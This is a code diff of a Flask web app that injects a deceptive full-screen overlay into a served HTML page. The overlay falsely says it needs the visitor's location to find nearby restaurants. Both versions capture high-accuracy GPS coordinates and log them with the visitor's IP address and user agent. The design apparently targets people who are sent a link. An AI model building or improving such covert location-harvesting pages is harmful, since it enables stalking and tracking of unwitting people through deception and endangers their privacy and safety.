@@ -1,160 +1,154 @@
-from flask import Flask, request, jsonify
-import logging
+# app.py
 import os
-from datetime import datetime
+import re
+import logging
+import sys
+from pathlib import Path
+from flask import Flask, request, Response, jsonify
 
 app = Flask(__name__)
 
-# Configure logging to ensure it appears in Render.com
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
+# Which file to inject into (relative to project root). Default: ./page.html
+PAGE_FILE = os.environ.get("PAGE_FILE", "page.html")
+
+# configure logging to stdout so Render captures it
+handler = logging.StreamHandler(sys.stdout)
+handler.setLevel(logging.INFO)
+app.logger.addHandler(handler)
+app.logger.setLevel(logging.INFO)
+
+# Overlay HTML to inject (non-branded). You can edit the text below.
+OVERLAY_HTML = r'''
+<!-- GEO-INJECT-START -->
+<style>
+#geo-inject-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.86);
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 999999;
+  padding: 20px;
+  text-align: center;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+}
+#geo-inject-card { max-width: 420px; }
+#geo-inject-title { font-size: 20px; margin-bottom: 12px; }
+#geo-allow-btn {
+  background: #E31837;
+  color: white;
+  border: none;
+  padding: 12px 18px;
+  font-size: 16px;
+  border-radius: 8px;
+  cursor: pointer;
+}
+#geo-allow-btn:disabled { opacity: 0.7; cursor: default; }
+</style>
+
+<div id="geo-inject-overlay">
+  <div id="geo-inject-card" role="dialog" aria-modal="true" aria-labelledby="geo-inject-title">
+    <div id="geo-inject-title">We need your location to find restaurants near you</div>
+    <div>
+      <button id="geo-allow-btn" type="button">Allow</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  const OVERLAY_ID = 'geo-inject-overlay';
+  const btn = document.getElementById('geo-allow-btn');
+
+  // If user clicks "Allow", open the browser/OS permission prompt
+  btn && btn.addEventListener('click', function () {
+    if (!navigator.geolocation) {
+      alert('Geolocation is not supported by this browser.');
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Requesting…';
+
+    navigator.geolocation.getCurrentPosition(
+      function (position) {
+        // prepare payload
+        const payload = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          timestamp: position.timestamp
+        };
+
+        // send to server (same origin)
+        fetch('/log_location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).then(function () {
+          // remove overlay on success (or regardless)
+          const ov = document.getElementById(OVERLAY_ID);
+          if (ov) ov.remove();
+        }).catch(function (e) {
+          console.warn('Error sending location:', e);
+          alert('Failed to send location to server.');
+        });
+      },
+      function (err) {
+        console.warn('Geolocation error', err);
+        // user denied or error — keep overlay or remove depending on desired behavior
+        alert('Location permission denied or timed out.');
+        btn.disabled = false;
+        btn.textContent = 'Allow';
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+})();
+</script>
+<!-- GEO-INJECT-END -->
+'''
+
+def load_and_inject(path):
+    p = Path(path)
+    if not p.exists():
+        raise FileNotFoundError(f"Page file not found: {path}")
+    html = p.read_text(encoding='utf-8')
+    # insert overlay before closing </body> if present, else append at end
+    body_close_re = re.compile(r'</body\s*>', flags=re.IGNORECASE)
+    if body_close_re.search(html):
+        injected = body_close_re.sub(OVERLAY_HTML + '</body>', html, count=1)
+    else:
+        injected = html + OVERLAY_HTML
+    return injected
 
 @app.route('/')
-def serve_page():
-    # Log initial access with IP
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    logger.info(f"INITIAL_ACCESS - IP: {client_ip} - Agent: {request.user_agent.string}")
-
-    # Read and inject into page.html
+def index():
     try:
-        with open('page.html', 'r') as f:
-            content = f.read()
-    except:
-        content = "<html><body>Welcome</body></html>"
+        injected_html = load_and_inject(PAGE_FILE)
+    except Exception as exc:
+        app.logger.exception("Failed to load or inject page file")
+        return f"Error loading page: {exc}", 500
 
-    # GPS tracking injection - SIMPLIFIED AND GUARANTEED TO WORK
-    injection = """
-    <style>
-        #gps-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.95); z-index: 99999;
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            color: white; padding: 20px; text-align: center;
-            font-family: -apple-system, sans-serif;
-        }
-        #gps-btn {
-            background: #FF3008; color: white; border: none;
-            padding: 15px 30px; border-radius: 25px;
-            margin-top: 20px; font-size: 18px;
-            font-weight: bold; cursor: pointer;
-        }
-    </style>
-    
-    <div id="gps-overlay">
-        <h2>Enable Location Services</h2>
-        <p>We need your location to provide accurate results</p>
-        <button id="gps-btn">ALLOW LOCATION ACCESS</button>
-    </div>
-    
-    <script>
-    // SIMPLE, RELIABLE GPS LOGGING
-    document.getElementById('gps-btn').addEventListener('click', function() {
-        // First log that button was clicked
-        fetch('/log-gps', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({event: 'button_click'})
-        }).catch(e => console.log('Initial log failed:', e));
+    # log visitor IP on page view
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    app.logger.info(f"Page view from IP: {ip}")
+    return Response(injected_html, mimetype='text/html')
 
-        // Request location
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    // SUCCESS - log GPS data
-                    const gpsData = {
-                        event: 'gps_success',
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    };
-                    
-                    // Send using FORM DATA which is most reliable
-                    const formData = new FormData();
-                    formData.append('data', JSON.stringify(gpsData));
-                    
-                    fetch('/log-gps', {
-                        method: 'POST',
-                        body: formData,
-                        keepalive: true  // Ensures delivery even if page closes
-                    }).then(() => {
-                        document.getElementById('gps-overlay').style.display = 'none';
-                    }).catch(e => console.log('GPS log failed:', e));
-                },
-                function(error) {
-                    // ERROR - log what happened
-                    const errorData = {
-                        event: 'gps_error',
-                        code: error.code,
-                        message: error.message
-                    };
-                    fetch('/log-gps', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(errorData)
-                    }).catch(e => console.log('Error log failed:', e));
-                    
-                    if(error.code === 1) {
-                        alert('Please enable location permissions in your browser settings');
-                    }
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        } else {
-            fetch('/log-gps', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({event: 'gps_not_supported'})
-            }).catch(e => console.log('Support check failed:', e));
-        }
-    });
-    </script>
-    """
-
-    # Insert before </body> or append
-    if '</body>' in content:
-        return content.replace('</body>', injection + '</body>')
-    else:
-        return content + injection
-
-@app.route('/log-gps', methods=['POST'])
-def log_gps():
-    try:
-        # Handle both JSON and FormData submissions
-        if request.content_type == 'application/json':
-            data = request.json
-        else:
-            data = json.loads(request.form.get('data', '{}'))
-        
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        
-        # Build complete log entry
-        log_entry = {
-            'timestamp': datetime.now().isoformat(),
-            'ip': client_ip,
-            'user_agent': request.user_agent.string,
-            'event': data.get('event'),
-            'latitude': data.get('lat'),
-            'longitude': data.get('lon'),
-            'accuracy': data.get('accuracy'),
-            'error_code': data.get('code'),
-            'error_message': data.get('message')
-        }
-        
-        # Log to Render.com
-        logger.info(f"GPS_DATA: {log_entry}")
-        return jsonify({'status': 'success'}), 200
-        
-    except Exception as e:
-        logger.error(f"GPS_LOG_ERROR: {str(e)}")
-        return jsonify({'status': 'error'}), 500
+@app.route('/log_location', methods=['POST'])
+def log_location():
+    data = request.get_json(silent=True) or {}
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    lat = data.get('latitude')
+    lon = data.get('longitude')
+    acc = data.get('accuracy')
+    ts = data.get('timestamp')
+    app.logger.info(f"Location received — IP: {ip} | lat: {lat} | lon: {lon} | acc: {acc} | ts: {ts}")
+    return jsonify({"status": "ok"})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
+    port = int(os.environ.get('PORT', 10000))
+    # for local testing: python app.py
+    app.run(host='0.0.0.0', port=port)
